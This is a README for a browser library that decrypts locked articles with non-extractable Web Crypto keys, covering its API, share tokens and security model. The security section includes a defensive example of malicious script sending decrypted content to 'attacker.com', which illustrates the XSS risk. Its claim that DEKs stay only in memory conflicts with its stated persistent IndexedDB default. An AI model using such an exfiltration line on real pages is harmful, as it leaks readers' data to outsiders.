# Capsule Client Library

Browser-side decryption library for the Capsule secure article-locking system.

## Features

- **Zero-Config Setup**: Keys auto-generated on first use, no manual initialization required
- **High-Level API**: Unlock content with a single function call, or go low-level for full control
- **HTML Processing**: Automatically finds encrypted elements, decrypts, and renders content
- **Script Execution**: Embedded `<script>` tags in decrypted content are executed (configurable)
- **Custom Events**: Listen for `capsule:unlock`, `capsule:error`, and `capsule:state` events
- **DEK Caching**: Encrypted DEKs cached in memory, sessionStorage, or IndexedDB
- **Auto-Renewal**: DEKs automatically renewed before expiry
- **Secure Key Storage**: RSA private keys stored with `extractable: false` in IndexedDB
- **Web Crypto API**: Uses native browser cryptography for maximum security

## Installation

```bash
npm install @sesamy/capsule
```

## Quick Start

### Minimal Setup

```typescript
import { CapsuleClient } from "@sesamy/capsule";

const capsule = new CapsuleClient({
  unlock: async ({ keyId, wrappedDek, publicKey, articleId }) => {
    const res = await fetch("/api/unlock", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ keyId, wrappedDek, publicKey }),
    });
    return res.json(); // { encryptedDek, expiresAt }
  },
});

// Unlock a specific article - keys are auto-created if needed!
const content = await capsule.unlockElement("article-123");
```

### Auto-Process All Encrypted Elements

```typescript
const capsule = new CapsuleClient({
  unlock: myUnlockFunction,
  autoProcess: true, // Automatically process elements on page load
});

// Listen for events
document.addEventListener("capsule:unlock", (e) => {
  console.log(
    "Unlocked:",
    e.detail.articleId,
    e.detail.content.substring(0, 100)
  );
});

document.addEventListener("capsule:error", (e) => {
  console.error("Failed to unlock:", e.detail.articleId, e.detail.error);
});
```

### HTML Markup

Add encrypted content to your page with the `data-capsule` attribute:

```html
<div
  data-capsule='{"articleId":"abc123","encryptedContent":"...","iv":"...","wrappedKeys":[...]}'
>
  <p>Loading encrypted content...</p>
</div>
```

When unlocked, the element's content is replaced with the decrypted HTML.

## Configuration Options

```typescript
interface CapsuleClientOptions {
  // Required for automatic unlocking
  unlock?: UnlockFunction; // Async function to fetch encrypted DEK from server

  // Key settings
  keySize?: 2048 | 4096; // RSA key size (default: 2048)

  // Processing behavior
  autoProcess?: boolean; // Auto-process elements on init (default: false)
  executeScripts?: boolean; // Execute <script> tags in decrypted content (default: true)
  selector?: string; // CSS selector for encrypted elements (default: '[data-capsule]')

  // DEK caching
  dekStorage?: "memory" | "session" | "persist"; // How to store DEKs (default: 'persist')
  renewBuffer?: number; // Ms before expiry to auto-renew (default: 5000)

  // Storage
  dbName?: string; // IndexedDB database name (default: 'capsule-keys')
  storeName?: string; // IndexedDB store name (default: 'keypair')

  // Debugging
  logger?: (message: string, level: "info" | "error" | "debug") => void;
}
```

## API Reference

### High-Level Methods

#### `getPublicKey(): Promise<string>`

Get the user's public key (Base64 SPKI format). **Creates a new key pair if none exists.**

```typescript
const publicKey = await capsule.getPublicKey();
// Send to server for key registration
```

#### `unlockElement(articleId: string): Promise<string>`

Find an encrypted element by article ID, decrypt it, and render the content.

```typescript
const content = await capsule.unlockElement("article-123");
```

#### `processAll(): Promise<Map<string, string | Error>>`

Process all encrypted elements on the page.

```typescript
const results = await capsule.processAll();
for (const [id, result] of results) {
  if (result instanceof Error) {
    console.error(`Failed: ${id}`, result);
  }
}
```

#### `unlock(article: EncryptedArticle, preferredKeyType?: 'tier' | 'article'): Promise<string>`

Decrypt an encrypted article, using cached DEK or fetching a new one.

```typescript
const article = JSON.parse(element.dataset.capsule);
const content = await capsule.unlock(article, "tier");
```

#### `unlockWithToken(article: EncryptedArticle, token: string): Promise<string>`

Decrypt content using a pre-signed share token. Use this for share links where the token is passed in the URL.

```typescript
// Get token from URL (e.g., ?token=eyJhbGc...)
const params = new URLSearchParams(window.location.search);
const token = params.get("token");

if (token) {
  const content = await capsule.unlockWithToken(article, token);
  console.log("Unlocked via share link!");
}
```

### Low-Level Methods

#### `decrypt(article: EncryptedArticle, encryptedDek: string): Promise<string>`

Decrypt content with a pre-fetched encrypted DEK. For full manual control.

```typescript
// Manual flow
const publicKey = await capsule.getPublicKey();
const { encryptedDek } = await myServerCall(publicKey, article.wrappedKeys[0]);
const content = await capsule.decrypt(article, encryptedDek);
```

#### `decryptPayload(payload: EncryptedPayload): Promise<string>`

Decrypt a simple single-key payload (no envelope encryption).

```typescript
const content = await capsule.decryptPayload({
  encryptedContent: "...",
  iv: "...",
  encryptedDek: "...",
});
```

### Utility Methods

#### `hasKeyPair(): Promise<boolean>`

Check if a key pair exists.

#### `getKeyInfo(): Promise<{ keySize: number; createdAt: number } | null>`

Get information about the stored key pair.

#### `regenerateKeyPair(): Promise<string>`

Generate a new key pair, replacing any existing one.

#### `clearAll(): Promise<void>`

Clear all stored keys and cached DEKs.

#### `getElementState(articleId: string): ElementState | undefined`

Get the current state of an encrypted element ('locked' | 'unlocking' | 'decrypting' | 'unlocked' | 'error').

## Events

The client emits custom events on elements and the document:

### `capsule:unlock`

Fired when content is successfully decrypted.

```typescript
document.addEventListener(
  "capsule:unlock",
  (e: CustomEvent<CapsuleUnlockEvent>) => {
    const { articleId, keyId, content, element } = e.detail;
  }
);
```

### `capsule:error`

Fired when decryption fails.

```typescript
document.addEventListener(
  "capsule:error",
  (e: CustomEvent<CapsuleErrorEvent>) => {
    const { articleId, error, element } = e.detail;
  }
);
```

### `capsule:state`

Fired when element state changes.

```typescript
document.addEventListener(
  "capsule:state",
  (e: CustomEvent<CapsuleStateEvent>) => {
    const { articleId, previousState, state, element } = e.detail;
    // state: 'locked' | 'unlocking' | 'decrypting' | 'unlocked' | 'error'
  }
);
```

## Unlock Function

The `unlock` function is called when content needs to be decrypted but no cached DEK is available:

```typescript
type UnlockFunction = (params: {
  keyId: string; // Key ID from wrappedKeys (e.g., "premium:bucket123")
  wrappedDek: string; // CMK-encrypted DEK from the article
  publicKey: string; // User's public key (Base64 SPKI)
  articleId: string; // Article being unlocked
}) => Promise<{
  encryptedDek: string; // DEK encrypted with user's public key
  expiresAt: string | number; // When the DEK expires
  bucketId?: string; // Optional bucket ID for time-based keys
  bucketPeriodSeconds?: number;
}>;
```

Example implementation:

```typescript
const unlock: UnlockFunction = async ({ keyId, wrappedDek, publicKey }) => {
  const response = await fetch("/api/unlock", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${getAuthToken()}`,
    },
    body: JSON.stringify({ keyId, wrappedDek, publicKey }),
  });

  if (!response.ok) {
    throw new Error("Unauthorized or payment required");
  }

  return response.json();
};
```

## Share Link Unlock

Capsule supports pre-signed share tokens for unlocking content without user authentication. This enables sharing articles on social media, via email, or as "gift article" links.

### How It Works

1. **Publisher generates a token** on the server (see `@sesamy/capsule-server`)
2. **Share URL is created**: `https://example.com/article/xyz?token=eyJhbGc...`
3. **Reader clicks link** - no login required
4. **Client detects token** and calls `unlockWithToken()`
5. **Server validates token** and returns DEK wrapped for the client
6. **Content is decrypted** just like a normal unlock

### Implementation

```typescript
import { CapsuleClient } from "@sesamy/capsule";

// Create client with token-aware unlock function
const capsule = new CapsuleClient({
  unlock: async ({ keyId, wrappedDek, publicKey, token, articleId }) => {
    // Token is automatically passed if using unlockWithToken()
    const response = await fetch("/api/unlock", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        token,        // Pre-signed share token (if present)
        wrappedDek,
        publicKey,
        articleId,
        keyId,        // Fallback for non-token unlock
      }),
    });
    return response.json();
  },
});

// Check for token in URL and auto-unlock
async function initPage() {
  const article = JSON.parse(
    document.querySelector("[data-capsule]")?.dataset.capsule ?? "{}"
  );
  
  const params = new URLSearchParams(window.location.search);
  const token = params.get("token");

  if (token && article.articleId) {
    try {
      const content = await capsule.unlockWithToken(article, token);
      renderContent(content);
      
      // Optional: remove token from URL for cleaner sharing
      const url = new URL(window.location.href);
      url.searchParams.delete("token");
      history.replaceState({}, "", url);
    } catch (err) {
      console.error("Share link unlock failed:", err);
      // Fall back to normal unlock flow or show paywall
    }
  }
}
```

### Token Properties

Tokens can include:

| Property | Description |
|----------|-------------|
| `tier` | Required. Which tier this grants access to |
| `expiresIn` | Required. Token validity: "1h", "24h", "7d", "30d" |
| `articleId` | Optional. Restrict to specific article |
| `maxUses` | Optional. Limit total uses across all readers |
| `userId` | Optional. Track which user/publisher created the link |

### Server-Side Token Handling

See [@sesamy/capsule-server](https://github.com/user/capsule/tree/main/packages/capsule-server#share-links--pre-signed-tokens) for:
- Token generation with `createTokenManager()`
- Token validation in your unlock endpoint
- The `unlockWithToken()` server method

## DEK Storage Modes

Control how decrypted DEKs are cached:

| Mode        | Storage           | Persistence              | Use Case             |
| ----------- | ----------------- | ------------------------ | -------------------- |
| `'memory'`  | JavaScript memory | Lost on page refresh     | Maximum security     |
| `'session'` | sessionStorage    | Lost when tab closes     | Balance security/UX  |
| `'persist'` | IndexedDB         | Survives browser restart | Best offline support |

Note: DEKs are stored **encrypted** with the user's public key. They must be unwrapped using the private key (which never leaves the browser's secure crypto subsystem).

## Security Model

### Private Key Protection: The Core Security Guarantee

The Capsule client's security is built on a fundamental principle: **the private key cannot be extracted from the browser**, even by the user themselves or malicious JavaScript code.

#### How Non-Extractable Keys Work

When generating a key pair, the private key is stored with `extractable: false`:

```typescript
const privateKey = await crypto.subtle.importKey(
  "jwk",
  privateKeyJwk,
  { name: "RSA-OAEP", hash: "SHA-256" },
  false, // NOT extractable - this is enforced at the browser engine level
  ["unwrapKey"]
);
```

This means:

- ✅ **The key can be used** for cryptographic operations (unwrapping DEKs)
- ❌ **The key cannot be exported** in any format (JWK, PKCS8, raw bytes)
- ❌ **The key cannot be copied** to another device or browser
- ❌ **The key cannot be downloaded** or sent to a server

#### What About IndexedDB Access?

Users and JavaScript code **can access IndexedDB** through DevTools or browser APIs:

```javascript
// This works - you can retrieve the key object
const db = await indexedDB.open("capsule-keys");
const keyPair = await db.get("keypair", "default");
console.log(keyPair.privateKey);
// Output: CryptoKey {type: "private", extractable: false, ...}

// But this FAILS - you cannot export the key material
await crypto.subtle.exportKey("jwk", keyPair.privateKey);
// Error: "key is not extractable"
```

The `CryptoKey` object stored in IndexedDB is just a **handle** or **reference** to the actual key material, which lives in the browser's secure crypto subsystem. Think of it like a key to a safe deposit box that only works inside the bank - you can use it there, but you can't take the contents home.

#### Attack Vector Analysis

| Attack Type                   | Can Extract Private Key? | Notes                                            |
| ----------------------------- | ------------------------ | ------------------------------------------------ |
| Server compromise             | ❌ No                    | Key never sent to server                         |
| Network interception          | ❌ No                    | Key never transmitted                            |
| XSS/malicious JavaScript      | ❌ No                    | Can _use_ key, but cannot _export_ it            |
| Browser DevTools access       | ❌ No                    | Can see key object, but not key bytes            |
| Database breach               | ❌ No                    | No server-side key storage                       |
| User attempting manual export | ❌ No                    | `extractable: false` prevents all export methods |

The **only** attack that works is using the key for its intended purpose:

```javascript
// Malicious code CAN do this:
const decryptedContent = await client.decryptArticle(payload);
await fetch("https://attacker.com", {
  method: "POST",
  body: decryptedContent, // Send decrypted content (not the key!)
});
```

This is why **XSS protection** (Content Security Policy, input sanitization) remains critical - not to protect the key itself, but to prevent unauthorized **use** of the key.

### Public vs Private Key: Why Different Extractability?

The key pair has different extractability settings for important reasons:

- **Public Key**: `extractable: true`
  - Must be exported to SPKI format and sent to the server
  - Safe to share - it can only _encrypt_, not _decrypt_
  - Server uses it to wrap DEKs before sending to client
- **Private Key**: `extractable: false`
  - Must stay locked in the browser's crypto engine
  - Can only be used for unwrapping DEKs, never exported
  - Guarantees end-to-end encryption - server never has decrypt capability

### Additional Security Layers

1. **DEKs in Memory Only**: Unwrapped DEKs are cached in JavaScript memory (not persisted) and lost on page refresh
2. **AES-GCM Authentication**: 128-bit auth tags prevent tampering with encrypted content
3. **Web Crypto API**: Uses hardware-accelerated cryptography when available (TPM, Secure Enclave)
4. **Secure Context Requirement**: Web Crypto API only works over HTTPS or localhost
5. **Origin Isolation**: IndexedDB is bound to the origin - other websites cannot access your keys

### What This Means for Your Application

✅ **Server compromise cannot leak user keys** - They're not on the server  
✅ **Database breach cannot decrypt content** - Private keys are client-side only  
✅ **Network eavesdropping is ineffective** - Only wrapped DEKs are transmitted  
✅ **Users cannot accidentally export their keys** - Browser prevents it  
✅ **True end-to-end encryption** - Only the user's browser can decrypt

### Limitations and Trade-offs

⚠️ **Key loss means data loss**: If a user clears browser data or switches devices, they lose access  
⚠️ **No cross-device sync**: Keys are tied to a single browser profile  
⚠️ **XSS can still abuse keys**: Malicious code can decrypt content (though not steal keys)

Consider implementing:

- Server-side encrypted key backup (wrapped with user password)
- Multi-device key synchronization (using secure key exchange protocols)
- Content Security Policy (CSP) to prevent XSS attacks

## Browser Compatibility

Requires browsers with Web Crypto API support:

- Chrome 37+
- Firefox 34+
- Safari 11+
- Edge 12+

## Development

```bash
npm install
npm run build
npm test
```

## License

MIT
